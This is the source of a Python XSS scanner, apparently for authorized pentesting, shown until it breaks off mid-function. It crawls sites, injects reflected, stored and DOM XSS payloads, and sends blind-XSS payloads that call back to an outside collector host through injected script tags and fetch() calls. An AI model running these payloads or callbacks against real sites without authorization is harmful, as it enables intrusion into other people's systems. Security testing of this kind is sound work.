#!/usr/bin/env python3
"""
AutoRecon-XSS (Python) — scanner de reconnaissance XSS réfléchi.

Usage légal uniquement : à n'exécuter que sur des applications dont tu es
propriétaire ou pour lesquelles tu disposes d'une autorisation écrite
(pentest avec périmètre, programme de bug bounty, environnement de test).

Ce qu'il fait :
  1. Crawl léger d'un domaine (même origine) pour collecter URLs + formulaires.
  2. Extraction des points d'injection : paramètres GET, champs de formulaire
     et en-têtes reflétés (Referer / User-Agent).
  3. Sonde caractère par caractère pour mesurer l'encodage, détection du
     contexte (HTML / attribut / script / commentaire), puis test de payload
     vérifié dans le bon contexte pour limiter les faux positifs.
  4. Surface étendue : liste d'URLs (-l) et URLs historiques Wayback (--wayback).
  5. Confirmation d'exécution côté client optionnelle (--dom, via Playwright).
  6. Rapport console + JSON / CSV / Markdown.

Dépendances : requests, beautifulsoup4
    pip install requests beautifulsoup4 --break-system-packages
Optionnel (DOM XSS) :
    pip install playwright && playwright install chromium
"""

from __future__ import annotations

import argparse
import concurrent.futures as cf
import csv
import json
import os
import random
import re
import string
import sys
import threading
import time
from dataclasses import dataclass, field, asdict
from urllib.parse import (
    urljoin, urlparse, parse_qs, urlsplit, urlunsplit, quote, urlencode,
)
from xml.etree import ElementTree as ET

import requests
import urllib3

try:
    from bs4 import BeautifulSoup
except ImportError:
    print("[!] beautifulsoup4 manquant : pip install requests beautifulsoup4")
    sys.exit(2)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

__version__ = "2.1.0"
DEFAULT_UA = f"AutoRecon-XSS/{__version__} (+authorized-testing)"

# Payloads de détection. Volontairement de type "sonde" : ils mesurent si et
# comment l'entrée est renvoyée dans la page, pas une charge d'exploitation.
# Chacun est associé au(x) contexte(s) où il serait réellement exécutable, pour
# éviter les faux positifs quand la chaîne est renvoyée hors contexte.
PAYLOADS = [
    ('"><svg/onload=PROBE>',        {"html-body", "tag", "attribute"}),
    ("'><img src=x onerror=PROBE>", {"html-body", "tag", "attribute"}),
    ("<xss>{marker}</xss>",         {"html-body", "tag"}),
    ('";PROBE//',                   {"javascript"}),
    ("';PROBE//",                   {"javascript"}),
]

# Caractères clés dont on vérifie l'encodage (renvoyés tels quels => risque).
SPECIAL_CHARS = ['<', '>', '"', "'", '/']

# En-têtes parfois reflétés dans la page.
HEADER_POINTS = ["Referer", "User-Agent"]


# --------------------------------------------------------------------------- #
#  Structures de données
# --------------------------------------------------------------------------- #
@dataclass
class InjectionPoint:
    url: str
    method: str                     # GET | POST | JSON | HEADER | PATH
    param: str
    params: dict = field(default_factory=dict)    # params du point (GET/POST/JSON)
    header: str | None = None       # nom d'en-tête si method HEADER
    seg_index: int | None = None    # index de segment de path si method PATH


@dataclass
class Finding:
    url: str
    method: str
    param: str
    reflected_chars: list = field(default_factory=list)
    context: str = "unknown"
    payload_echoed: str | None = None
    severity: str = "info"
    header: str | None = None
    poc: str | None = None      # commande curl de reproduction
    csp: str | None = None      # Content-Security-Policy observée (si présente)


# --------------------------------------------------------------------------- #
#  Client HTTP (avec rate-limit optionnel)
# --------------------------------------------------------------------------- #
class Http:
    def __init__(self, timeout=10, ua=DEFAULT_UA, cookies=None, proxy=None,
                 verify=True, delay=0.0, max_bytes=3_000_000, retries=2,
                 pool=16, extra_headers=None, max_requests=0):
        self.s = requests.Session()
        self.s.headers.update({"User-Agent": ua})
        if cookies:
            self.s.headers.update({"Cookie": cookies})
        if extra_headers:
            self.s.headers.update(extra_headers)
        if proxy:
            self.s.proxies.update({"http": proxy, "https": proxy})
        # Pool de connexions dimensionné sur le nombre de threads de scan.
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=pool, pool_maxsize=pool, max_retries=0,
        )
        self.s.mount("http://", adapter)
        self.s.mount("https://", adapter)
        self.timeout = timeout
        self.verify = verify
        self.delay = delay
        self.max_bytes = max_bytes
        self.retries = max(0, retries)
        self.max_requests = max(0, max_requests)   # 0 = illimité
        self._lock = threading.Lock()
        self._last = 0.0
        self._req_count = 0
        self._budget_warned = False

    def budget_exceeded(self) -> bool:
        return bool(self.max_requests) and self._req_count >= self.max_requests

    def _throttle(self):
        if self.delay <= 0:
            return
        with self._lock:
            wait = self.delay - (time.time() - self._last)
            if wait > 0:
                time.sleep(wait)
            self._last = time.time()

    def _read_capped(self, resp):
        # Limite la taille lue en mémoire (protection OOM sur grosses pages).
        chunks, total = [], 0
        for chunk in resp.iter_content(8192, decode_unicode=False):
            if not chunk:
                break
            chunks.append(chunk)
            total += len(chunk)
            if total >= self.max_bytes:
                break
        raw = b"".join(chunks)
        try:
            return raw.decode(resp.encoding or "utf-8", errors="replace")
        except (LookupError, TypeError):
            return raw.decode("utf-8", errors="replace")

    def request(self, method, url, params=None, data=None, json_body=None,
                headers=None, files=None):
        # Budget global : au-delà, on arrête d'émettre (garde-fou anti-emballement).
        if self.budget_exceeded():
            if not self._budget_warned:
                self._budget_warned = True
                print(f"\n[!] Budget de requêtes atteint ({self.max_requests}) — "
                      f"arrêt des envois. Augmente --max-requests si besoin.",
                      file=sys.stderr)
            return None
        for attempt in range(self.retries + 1):
            self._throttle()
            try:
                resp = self.s.request(
                    method, url, params=params, data=data, json=json_body,
                    headers=headers, files=files, timeout=self.timeout,
                    verify=self.verify, allow_redirects=True, stream=True,
                )
                resp._text_capped = self._read_capped(resp)  # type: ignore[attr-defined]
                resp.close()
                with self._lock:
                    self._req_count += 1
                return resp
            except requests.RequestException:
                # Backoff exponentiel + jitter sur erreurs transitoires.
                if attempt < self.retries:
                    time.sleep((0.4 * (2 ** attempt)) + random.uniform(0, 0.25))
        return None

    @property
    def req_count(self) -> int:
        return self._req_count

    def get(self, url, params=None, headers=None):
        return self.request("GET", url, params=params, headers=headers)

    def post(self, url, data=None, json_body=None, headers=None, files=None):
        return self.request("POST", url, data=data, json_body=json_body,
                            headers=headers, files=files)


def body_of(resp) -> str:
    """Corps de réponse (version bornée en mémoire si disponible)."""
    if resp is None:
        return ""
    # NB : ne PAS faire getattr(resp, "_text_capped", resp.text) — l'argument
    # par défaut resp.text serait évalué même quand _text_capped existe, et le
    # flux étant déjà consommé, requests lèverait "content already consumed".
    cap = getattr(resp, "_text_capped", None)
    return cap if cap is not None else resp.text


# --------------------------------------------------------------------------- #
#  Barre de progression (sans dépendance externe)
# --------------------------------------------------------------------------- #
def _fmt_time(seconds: float) -> str:
    seconds = int(max(0, seconds))
    h, rem = divmod(seconds, 3600)
    m, s = divmod(rem, 60)
    return f"{h:d}:{m:02d}:{s:02d}" if h else f"{m:02d}:{s:02d}"


class Progress:
    """Barre de progression sur stderr : %, compteur, débit, écoulé, ETA.
    Thread-safe et throttlée pour ne pas inonder le terminal."""

    def __init__(self, total: int, label: str = "", enabled: bool = True,
                 width: int = 22, min_interval: float = 0.1):
        self.total = max(1, int(total))
        self.label = label
        self.enabled = enabled
        self.width = width
        self.min_interval = min_interval
        self.done = 0
        self.start = time.time()
        self._last = 0.0
        self._lock = threading.Lock()

    def update(self, n: int = 1):
        with self._lock:
            self.done += n
            now = time.time()
            if self.done < self.total and (now - self._last) < self.min_interval:
                return
            self._last = now
            self._render(now)

    def _render(self, now: float):
        if not self.enabled:
            return
        frac = min(1.0, self.done / self.total)
        filled = int(self.width * frac)
        bar = "#" * filled + "-" * (self.width - filled)
        elapsed = now - self.start
        rate = self.done / elapsed if elapsed > 0 else 0.0
        eta = (self.total - self.done) / rate if rate > 0 else 0.0
        line = (f"\r{self.label} [{bar}] {int(frac * 100):3d}% "
                f"{self.done}/{self.total} | {rate:4.1f}/s "
                f"| {_fmt_time(elapsed)}<{_fmt_time(eta)}   ")
        print(line, end="", file=sys.stderr, flush=True)

    def close(self):
        if self.enabled:
            self._render(time.time())
            print("", file=sys.stderr)


# --------------------------------------------------------------------------- #
#  Crawler (même origine, profondeur limitée, périmètre vérifié)
# --------------------------------------------------------------------------- #
class Crawler:
    def __init__(self, http: Http, base: str, max_pages=50, scope=None,
                 include=None, exclude=None, seed_sitemap=False, path_inject=False):
        self.http = http
        self.base = base
        self.root = urlparse(base).netloc
        self.max_pages = max_pages
        self.scope = scope            # re.Pattern | None (netloc autorisés)
        self.include = include        # re.Pattern | None (URLs à garder)
        self.exclude = exclude        # re.Pattern | None (URLs à ignorer)
        self.seed_sitemap = seed_sitemap
        self.path_inject = path_inject
        self.seen_pages: set[str] = set()   # dédup crawl (path seul)
        self.seen_params: set = set()       # dédup endpoints paramétrés
        self.urls: set[str] = set()         # pages HTML réellement récupérées
        self.links: set[str] = set()        # tous les liens in-scope découverts
        self.points: list[InjectionPoint] = []

    def in_scope(self, url: str) -> bool:
        netloc = urlparse(url).netloc
        if self.exclude is not None and self.exclude.search(url):
            return False
        if self.include is not None and not self.include.search(url):
            return False
        if self.scope is not None:
            return bool(self.scope.search(netloc))
        return netloc == self.root

    def _seeds(self) -> list[str]:
        """URLs de départ : base + robots.txt + sitemap.xml si demandé."""
        seeds = [self.base]
        if not self.seed_sitemap:
            return seeds
        origin = f"{urlsplit(self.base).scheme}://{self.root}"
        candidates: list[str] = []
        robots = self.http.get(urljoin(origin, "/robots.txt"))
        if robots is not None:
            for line in body_of(robots).splitlines():
                if line.lower().startswith("sitemap:"):
                    candidates.append(line.split(":", 1)[1].strip())
        candidates.append(urljoin(origin, "/sitemap.xml"))
        for sm in candidates:
            if not self.in_scope(sm):
                continue
            resp = self.http.get(sm)
            if resp is None:
                continue
            try:
                root = ET.fromstring(body_of(resp).encode("utf-8", "replace"))
            except ET.ParseError:
                continue
            for loc in root.iter():
                if loc.tag.endswith("loc") and loc.text:
                    seeds.append(loc.text.strip())
        return seeds

    def _page_key(self, url: str) -> str:
        """Clé de dédup crawl : ignore la query (évite l'explosion ?a=1,?a=2)."""
        parts = urlsplit(url)
        return urlunsplit((parts.scheme, parts.netloc, parts.path, "", ""))

    def _norm(self, url: str) -> str:
        parts = urlsplit(url)
        return urlunsplit((parts.scheme, parts.netloc, parts.path, parts.query, ""))

    def crawl(self, progress=True):
        queue = self._seeds()
        last_tick = 0.0
        while queue and len(self.seen_pages) < self.max_pages:
            url = self._norm(queue.pop(0))
            key = self._page_key(url)
            if key in self.seen_pages or not self.in_scope(url):
                continue
            self.seen_pages.add(key)
            if progress and (time.time() - last_tick) > 0.1:
                last_tick = time.time()
                print(f"\r[*] crawl : {len(self.seen_pages)}/{self.max_pages} "
                      f"pages | {len(self.points)} points | file {len(queue)}   ",
                      end="", file=sys.stderr, flush=True)
            resp = self.http.get(url)
            if not resp or "text/html" not in resp.headers.get("Content-Type", ""):
                continue
            # Le redirect a-t-il quitté le périmètre ? Si oui on n'exploite pas.
            if not self.in_scope(resp.url):
                continue
            self.urls.add(url)
            self._harvest_get_params(url)
            if self.path_inject:
                self._harvest_path_segments(url)
            body = body_of(resp)
            try:
                soup = BeautifulSoup(body, "html.parser")
            except Exception:
                continue
            # Respect d'un éventuel <base href> pour la résolution des liens.
            base_tag = soup.find("base", href=True)
            page_base = urljoin(url, base_tag["href"]) if base_tag else url
            self._harvest_forms(page_base, soup)
            for a in soup.find_all("a", href=True):
                nxt = self._norm(urljoin(page_base, a["href"]))
                if not nxt.startswith(("http://", "https://")) or not self.in_scope(nxt):
                    continue
                # Tout lien in-scope découvert = page d'observation candidate
                # pour le mode stored (même si on ne le crawle pas, ex. /profile
                # qui redirige vers / sans session).
                self.links.add(nxt)
                if self._page_key(nxt) not in self.seen_pages:
                    queue.append(nxt)
        if progress:
            print(f"\r[*] crawl : {len(self.seen_pages)} pages | "
                  f"{len(self.points)} points" + " " * 20, file=sys.stderr)
        return self.points

    def _harvest_get_params(self, url: str):
        parts = urlsplit(url)
        q = parse_qs(parts.query)
        if not q:
            return
        # Dédup par (chemin + jeu de noms de params) : une URL Wayback avec
        # ?id=1 et une autre avec ?id=2 décrivent le même endpoint à tester.
        key = (parts.scheme, parts.netloc, parts.path, frozenset(q.keys()))
        if key in self.seen_params:
            return
        self.seen_params.add(key)
        flat = {k: v[0] for k, v in q.items()}
        for param in q:
            self.points.append(InjectionPoint(url, "GET", param, dict(flat)))

    def ingest_param_urls(self, urls):
        """Ajoute des points GET depuis une liste d'URLs (liste/Wayback),
        sans les crawler : seuls les endpoints paramétrés dans le périmètre
        sont retenus, dédupliqués par chemin + noms de params."""
        added_before = len(self.points)
        for raw in urls:
            u = (raw or "").strip()
            if not u or not u.lower().startswith(("http://", "https://")):
                continue
            if "?" not in u or not self.in_scope(u):
                continue
            self._harvest_get_params(u)
        return len(self.points) - added_before

    def _harvest_path_segments(self, url: str):
        """Chaque segment de path devient un point d'injection (REST-like)."""
        parts = urlsplit(url)
        segs = [s for s in parts.path.split("/")]
        for i, seg in enumerate(segs):
            if not seg:
                continue
            self.points.append(
                InjectionPoint(url, "PATH", f"segment[{i}]", {}, seg_index=i)
            )

    def _harvest_forms(self, page_url: str, soup: BeautifulSoup):
        # Texte de tous les scripts inline (pour détecter une soumission JSON via JS).
        scripts_text = " ".join(s.get_text() or "" for s in soup.find_all("script"))
        scripts_low = scripts_text.lower()
        for form in soup.find_all("form"):
            action = urljoin(page_url, form.get("action") or page_url)
            if not self.in_scope(action):
                continue
            method = (form.get("method") or "GET").upper()
            enctype = (form.get("enctype") or "").lower()
            action_path = urlsplit(action).path
            # Détection d'une soumission JSON : enctype json, OU formulaire
            # intercepté en JS (onsubmit) avec un script qui sérialise du JSON,
            # OU un script postant de l'application/json vers cette action.
            # Fréquent dans les apps modernes/SPA (form "cosmétique" + fetch JSON).
            json_submit = (
                "json" in enctype
                or (form.get("onsubmit") and
                    ("json.stringify" in scripts_low or "application/json" in scripts_low))
                or (action_path and action_path in scripts_text and
                    "application/json" in scripts_low)
            )
            if method == "POST" and json_submit:
                method = "JSON"
            fields = {}
            file_fields = []
            for inp in form.find_all(["input", "textarea", "select"]):
                name = inp.get("name")
                if not name:
                    continue
                if inp.name == "input" and (inp.get("type") or "").lower() == "file":
                    file_fields.append(name)
                else:
                    fields[name] = inp.get("value") or "test"
            for param in fields:
                self.points.append(
                    InjectionPoint(action, method, param, dict(fields))
                )
            # Champs d'upload de fichier => points UPLOAD (test SVG/HTML).
            for fname in file_fields:
                self.points.append(
                    InjectionPoint(action, "UPLOAD", fname, dict(fields))
                )


# --------------------------------------------------------------------------- #
#  Analyse de contexte de réflexion
# --------------------------------------------------------------------------- #
def rand_marker(n=8) -> str:
    return "zz" + "".join(
        random.choices(string.ascii_lowercase + string.digits, k=n)
    ) + "zz"


def detect_context_at(body: str, idx: int) -> str:
    """Contexte de réflexion à partir d'une position dans le corps."""
    if idx == -1:
        return "not-reflected"
    before = body[max(0, idx - 200):idx]
    after = body[idx:idx + 200]
    # Commentaire HTML <!-- ... -->
    last_open = before.rfind("<!--")
    last_close = before.rfind("-->")
    if last_open > last_close:
        return "html-comment"
    # À l'intérieur d'un <script> ... </script>
    s_open = before.lower().rfind("<script")
    s_close = before.lower().rfind("</script")
    if s_open > s_close:
        return "javascript"
    # À l'intérieur d'une valeur d'attribut : ... attr="___  (guillemet non refermé)
    if re.search(r"=\s*['\"][^'\"]*$", before):
        return "attribute"
    # À l'intérieur d'une balise ouverte : <tag ___
    if re.search(r"<[a-zA-Z/][^>]*$", before) and ">" not in after[:1]:
        return "tag"
    return "html-body"


def detect_context(body: str, marker: str) -> str:
    return detect_context_at(body, body.find(marker))


def send_payload(http: Http, point: InjectionPoint, value: str):
    """Envoie `value` dans le point d'injection, selon sa méthode."""
    if point.method == "HEADER":
        return http.get(point.url, headers={point.header: value})
    if point.method == "PATH":
        base = urlsplit(point.url)
        segs = base.path.split("/")
        if point.seg_index is None or point.seg_index >= len(segs):
            return None
        segs[point.seg_index] = quote(value, safe="")
        new_path = "/".join(segs)
        url = urlunsplit((base.scheme, base.netloc, new_path, base.query, ""))
        return http.get(url)
    params = dict(point.params)
    params[point.param] = value
    if point.method == "GET":
        base = urlsplit(point.url)
        url = urlunsplit((base.scheme, base.netloc, base.path, "", ""))
        return http.get(url, params=params)
    if point.method == "JSON":
        return http.post(point.url, json_body=params)
    return http.post(point.url, data=params)


# --------------------------------------------------------------------------- #
#  Scanner
# --------------------------------------------------------------------------- #
class Scanner:
    def __init__(self, http: Http, threads=8):
        self.http = http
        self.threads = threads

    def _send(self, point: InjectionPoint, value: str):
        return send_payload(self.http, point, value)

    def _reflected_specials(self, point: InjectionPoint, marker: str) -> list[str]:
        """Une requête par caractère : fiable sur l'encodage réel de chacun."""
        out = []
        for ch in SPECIAL_CHARS:
            probe = f"{marker}{ch}{marker}"
            r = self._send(point, probe)
            if r is not None and probe in body_of(r):
                out.append(ch)
        return out

    def test_point(self, point: InjectionPoint) -> Finding | None:
        marker = rand_marker()
        # 1) le marqueur seul est-il réfléchi ? (sinon rien à faire)
        r = self._send(point, marker)
        if r is None:
            return None
        body = body_of(r)
        idx = body.find(marker)
        if idx == -1:
            return None

        f = Finding(url=point.url, method=point.method, param=point.param,
                    header=point.header)
        f.context = detect_context_at(body, idx)
        f.csp = r.headers.get("Content-Security-Policy")

        # 2) quels caractères spéciaux passent NON encodés (requête par char)
        f.reflected_chars = self._reflected_specials(point, marker)

        # 3) si des chars utiles passent, tester un payload adapté au contexte
        #    et vérifier que l'echo est bien dans un contexte exécutable.
        if f.reflected_chars:
            for raw, ctx_ok in PAYLOADS:
                if f.context not in ctx_ok:
                    continue
                probe_tok = rand_marker(4)
                payload = raw.replace("PROBE", probe_tok)
                payload = payload.format(marker=marker) if "{marker}" in payload else payload
                rr = self._send(point, payload)
                if rr is None:
                    continue
                rbody = body_of(rr)
                pos = rbody.find(payload)
                if pos != -1 and detect_context_at(rbody, pos) == f.context:
                    f.payload_echoed = payload
                    break

        # 4) scoring
        has_angle = "<" in f.reflected_chars and ">" in f.reflected_chars
        if f.payload_echoed and has_angle:
            f.severity = "high"
        elif has_angle:
            f.severity = "medium"
        elif f.reflected_chars:
            f.severity = "low"
        else:
            f.severity = "info"
        if f.payload_echoed:
            f.poc = build_poc(point, f.payload_echoed)
        return f

    def run(self, points: list[InjectionPoint], progress=True) -> list[Finding]:
        findings = []
        # dédoublonnage des points (url+method+param+header+seg)
        uniq = {}
        for p in points:
            uniq[(p.url, p.method, p.param, p.header, p.seg_index)] = p
        prog = Progress(len(uniq), label="[*] réfléchi") if progress else None
        with cf.ThreadPoolExecutor(max_workers=self.threads) as ex:
            futs = {ex.submit(self.test_point, p): p for p in uniq.values()}
            for fut in cf.as_completed(futs):
                try:
                    res = fut.result()
                except Exception:
                    res = None
                if prog:
                    prog.update()
                if res and res.severity != "info":
                    findings.append(res)
        if prog:
            prog.close()
        # dédoublonnage des findings identiques
        seen, deduped = set(), []
        for f in findings:
            k = (f.url, f.method, f.param, f.header, f.context, f.severity)
            if k not in seen:
                seen.add(k)
                deduped.append(f)
        return deduped


# --------------------------------------------------------------------------- #
#  Scanner STORED / second-ordre
# --------------------------------------------------------------------------- #
class StoredScanner:
    """Détecte les réflexions de SECOND ORDRE : une entrée injectée sur un point
    (ex. username en POST /login) qui ressort sur une AUTRE page (ex. /profile).

    Pour chaque point : injecte un marqueur unique + sondes de caractères, puis
    recharge les pages d'observation DANS LA MÊME SESSION et cherche le marqueur.
    Séquentiel par point (une connexion/session peut être modifiée par
    l'injection elle-même, ex. un login)."""

    def __init__(self, http: Http, observe_urls, progress=True):
        self.http = http
        self.observe_urls = list(dict.fromkeys(observe_urls))  # unique, ordre gardé
        self.progress = progress

    def run(self, points: list[InjectionPoint]) -> list[Finding]:
        uniq = {}
        for p in points:
            uniq[(p.url, p.method, p.param, p.header, p.seg_index)] = p
        targets = list(uniq.values())
        findings: list[Finding] = []
        if not targets or not self.observe_urls:
            return findings
        prog = Progress(len(targets), label="[*] stored  ") if self.progress else None
        for point in targets:
            marker = rand_marker()
            probe = marker + "".join(f"{marker}{c}{marker}" for c in SPECIAL_CHARS)
            send_payload(self.http, point, probe)
            for obs in self.observe_urls:
                r = self.http.get(obs)
                if r is None:
                    continue
                body = body_of(r)
                if marker not in body:
                    continue
                chars = [c for c in SPECIAL_CHARS if f"{marker}{c}{marker}" in body]
                ctx = detect_context(body, marker)
                has_angle = "<" in chars and ">" in chars
                sev = "high" if has_angle else ("low" if chars else "info")
                f = Finding(url=point.url, method=point.method, param=point.param,
                            header=point.header, reflected_chars=chars,
                            context=f"stored@{obs} ({ctx})", severity=sev)
                if has_angle:
                    f.payload_echoed = '"><svg/onload=alert(1)>'
                    f.poc = (f"# injecte via {point.method} {point.url} (param "
                             f"{point.header or point.param}), puis observe {obs}")
                if sev != "info":
                    findings.append(f)
            if prog:
                prog.update()
        if prog:
            prog.close()
        return findings


# --------------------------------------------------------------------------- #
#  Scanner BLIND XSS (callback out-of-band)
# --------------------------------------------------------------------------- #
# En-têtes souvent stockés puis rendus dans un back-office (logs, admin).
BLIND_HEADERS = ["User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host"]


def blind_payloads(beacon: str) -> list[str]:
    """Sondes blind : si elles s'exécutent quelque part d'invisible (admin, logs),
    elles font une simple requête vers TON collecteur `beacon` (ex. Interactsh).
    Bénin : un ping qui prouve l'exécution, pas d'exfiltration de données."""
    return [
        f'"><script src=//{beacon}></script>',
        f'"><svg onload=fetch("//{beacon}")>',
        f'"><img src=x onerror=fetch("//{beacon}")>',
        f"'><script src=//{beacon}></script>",
        f"';fetch('//{beacon}');//",
        f'javascript:fetch("//{beacon}")',
    ]


class BlindScanner:
    """Blind XSS : injecte partout des sondes qui rappellent un collecteur
    out-of-band (Interactsh / XSS Hunter / ton domaine). Pas de confirmation
    immédiate — tu surveilles ton collecteur. Chaque point reçoit un sous-domaine
    unique `tagX.<collecteur>` pour identifier la source quand un hit arrive."""

    def __init__(self, http: Http, callback: str, inject_headers=True,
                 progress=True):
        self.http = http
        self.host = re.sub(r"^https?://", "", callback.strip()).rstrip("/")
        self.inject_headers = inject_headers
        self.progress = progress
        self.mapping: dict[str, dict] = {}
        self._n = 0

    def _tag(self) -> str:
        t = f"x{self._n:x}"
        self._n += 1
        return t

    def run(self, points: list[InjectionPoint]) -> dict:
        uniq = {}
        for p in points:
            uniq[(p.url, p.method, p.param, p.header, p.seg_index)] = p
        targets = list(uniq.values())
        if self.inject_headers:
            for u in dict.fromkeys(p.url for p in targets):
                for h in BLIND_HEADERS:
                    targets.append(InjectionPoint(u, "HEADER", h, {}, header=h))
        if not targets:
            return self.mapping
        prog = Progress(len(targets), label="[*] blind   ") if self.progress else None
        for p in targets:
            tag = self._tag()
            beacon = f"{tag}.{self.host}"
            for payload in blind_payloads(beacon):
                send_payload(self.http, p, payload)
            self.mapping[tag] = {
                "beacon": beacon, "url": p.url, "method": p.method,
                "point": p.header or p.param,
            }
            if prog:
                prog.update()
        if prog:
            prog.close()
        return self.mapping


# --------------------------------------------------------------------------- #
#  Scanner DOM XSS (optionnel, nécessite Playwright)
# --------------------------------------------------------------------------- #
# Sondes qui, SI elles s'exécutent, appellent notre propre callback instrumenté.
# Convention : le jeton TOKEN est remplacé par l'appel complet
# window.__arxcb('<marqueur>') ; TOKENBT par sa forme sans parenthèses
# (tagged template window.__arxcb`<marqueur>`, pour les filtres bloquant "()").
# C'est un marqueur de détection bénin (aucune exfiltration, aucun vrai alert) :
# il prouve seulement qu'une entrée contrôlée atteint un sink exécutable client.
DOM_PAYLOADS = [
    '"><img src=x onerror=TOKEN>',
    "'><img src=x onerror=TOKEN>",
    '"><svg onload=TOKEN>',
    '" autofocus onfocus=TOKEN x="',
    "';TOKEN;//",
    "'-TOKEN-'",
    '\\";TOKEN;//',
    "javascript:TOKEN",
]

# Script injecté AVANT tout script de la page (et de CHAQUE iframe/srcdoc) :
# installe le callback et piège les dialogues. Le callback remonte le hit vers
# la frame top quand c'est possible (iframe srcdoc = même origine), pour que la
# détection fonctionne même quand l'exécution a lieu dans une iframe.
_DOM_INIT = """
window.__arx_hits = window.__arx_hits || [];
window.__arxcb = function (t) {
  var s = String(t);
  try { var w = window.top || window; w.__arx_hits = w.__arx_hits || []; w.__arx_hits.push(s); }
  catch (e) {}
  try { window.__arx_hits.push(s); } catch (e) {}
};
(function () {
  var names = ['alert', 'confirm', 'prompt'];
  for (var i = 0; i < names.length; i++) {
    (function (n) {
      try { window[n] = function (m) { window.__arxcb('dialog:' + n); }; } catch (e) {}
    })(names[i]);
  }
})();
// Détecte si la page enregistre un écouteur 'message' (cible postMessage).
(function () {
  try {
    window.__arx_has_msg = false;
    var orig = window.addEventListener;
    window.addEventListener = function (t, f, o) {
      if (t === 'message') window.__arx_has_msg = true;
      return orig.call(this, t, f, o);
    };
  } catch (e) {}
})();
"""


def dom_hit(page, token) -> bool:
    """Vrai si le callback a été appelé dans N'IMPORTE quelle frame (top ou
    iframe/srcdoc) — indispensable pour les rendus en iframe (sandbox HTML)."""
    frames = []
    try:
        frames = list(page.frames)
    except Exception:
        frames = []
    for fr in frames or [page]:
        try:
            hits = fr.evaluate("window.__arx_hits || []")
        except Exception:
            continue
        if any(token in str(h) or str(h).startswith("dialog:") for h in hits):
            return True
    return False


def _dom_build_url(point: InjectionPoint, payload: str) -> str | None:
    """Construit une URL navigable (GET/PATH) avec le payload injecté."""
    base = urlsplit(point.url)
    if point.method == "GET":
        params = dict(point.params)
        params[point.param] = payload
        query = urlencode(params, safe="")
        return urlunsplit((base.scheme, base.netloc, base.path, query, ""))
    if point.method == "PATH" and point.seg_index is not None:
        segs = base.path.split("/")
        if point.seg_index < len(segs):
            segs[point.seg_index] = quote(payload, safe="")
            return urlunsplit((base.scheme, base.netloc, "/".join(segs),
                               base.query, ""))
    return None


class DomScanner:
    """Confirme l'exécution côté client (DOM/reflected) dans un vrai navigateur.
    Testé sur les points navigables par URL (GET, PATH) ; le hash (#) est
    testé en plus si demandé (DOM XSS basé sur location.hash)."""

    def __init__(self, cookies=None, headers=None, timeout_ms=8000,
                 wait_ms=700, test_hash=False, limit=200, insecure=False,
                 payloads=None):
        self.cookies = cookies
        self.headers = headers or {}
        self.timeout_ms = timeout_ms
        self.wait_ms = wait_ms
        self.test_hash = test_hash
        self.limit = limit
        self.insecure = insecure
        # Liste de templates utilisant TOKEN (défaut : DOM_PAYLOADS intégrés).
        self.payloads = payloads or DOM_PAYLOADS

    @staticmethod
    def available() -> bool:
        try:
            import playwright.sync_api  # noqa: F401
            return True
        except ImportError:
            return False

    def _candidate_urls(self, point: InjectionPoint, token: str):
        """Génère (payload, action, kind) :
        - GET/PATH : action = URL à visiter (kind query/hash)
        - POST     : action = dict de params à poster (kind post)"""
        cb = f"window.__arxcb('{token}')"
        cb_bt = f"window.__arxcb`{token}`"      # forme sans parenthèses
        for raw in self.payloads:
            # TOKENBT d'abord (TOKEN en est un préfixe).
            payload = raw.replace("TOKENBT", cb_bt).replace("TOKEN", cb)
            if point.method in ("GET", "PATH"):
                u = _dom_build_url(point, payload)
                if u:
                    yield payload, u, "query"
                if self.test_hash and point.method == "GET":
                    base = urlsplit(point.url)
                    frag = urlunsplit((base.scheme, base.netloc, base.path,
                                       base.query, quote(payload, safe="")))
                    yield payload, frag, "hash"
            elif point.method == "POST":
                params = dict(point.params)
                params[point.param] = payload
                yield payload, params, "post"

    @staticmethod
    def _form_page(url: str, params: dict) -> str:
        """Page qui poste automatiquement un formulaire vers `url`.
        Valeurs posées via JS (pas dans le HTML) pour éviter tout échappement
        qui dénaturerait le payload."""
        data = json.dumps(params)
        action = json.dumps(url)
        return (
            "<!doctype html><html><body><form id='__f' method='POST'></form>"
            "<script>"
            f"var u={action},d={data};"
            "var f=document.getElementById('__f');f.action=u;"
            "for(var k in d){var i=document.createElement('input');"
            "i.type='hidden';i.name=k;i.value=d[k];f.appendChild(i);}"
            "f.submit();</script></body></html>"
        )

    def run(self, points: list[InjectionPoint], progress=True) -> list[Finding]:
        from playwright.sync_api import sync_playwright, Error as PWError

        # Points testables dans le navigateur (GET/PATH par URL, POST par form).
        uniq = {}
        for p in points:
            if p.method in ("GET", "PATH", "POST"):
                uniq[(p.url, p.method, p.param, p.seg_index)] = p
        targets = list(uniq.values())[: self.limit]
        findings: list[Finding] = []
        if not targets:
            return findings

        extra = {"ignore_https_errors": True} if self.insecure else {}
        with sync_playwright() as pw:
            try:
                browser = pw.chromium.launch(headless=True)
            except PWError as e:
                msg = str(e)
                if "Executable doesn't exist" in msg or "playwright install" in msg:
                    print("[!] Navigateur Playwright non installé. Lance :\n"
                          "    playwright install chromium", file=sys.stderr)
                else:
                    print(f"[!] Lancement du navigateur impossible : {msg}",
                          file=sys.stderr)
                return findings
            ctx = browser.new_context(**extra)
            if self.headers:
                ctx.set_extra_http_headers(self.headers)
            if self.cookies:
                # "k=v; k2=v2" -> cookies sur le domaine cible
                for u in {t.url for t in targets}:
                    host = urlparse(u).netloc
                    jar = []
                    for part in self.cookies.split(";"):
                        if "=" in part:
                            k, v = part.split("=", 1)
                            jar.append({"name": k.strip(), "value": v.strip(),
                                        "domain": host, "path": "/"})
                    if jar:
                        try:
                            ctx.add_cookies(jar)
                        except PWError:
                            pass
            ctx.add_init_script(_DOM_INIT)

            prog = Progress(len(targets), label="[*] DOM     ") if progress else None
            for point in targets:
                token = rand_marker(6)
                hit = self._probe_point(ctx, point, token, PWError)
                if prog:
                    prog.update()
                if hit:
                    payload, where = hit
                    findings.append(Finding(
                        url=point.url, method=point.method, param=point.param,
                        header=point.header, context=f"dom-exec/{where}",
                        reflected_chars=[], payload_echoed=payload,
                        severity="high", poc=build_poc(point, payload),
                    ))
            if prog:
                prog.close()
            ctx.close()
            browser.close()
        return findings

    def _fired(self, page, token) -> bool:
        return dom_hit(page, token)

    def _probe_point(self, ctx, point, token, PWError):
        for payload, action, where in self._candidate_urls(point, token):
            page = ctx.new_page()
            fired = False
            try:
                if where == "post":
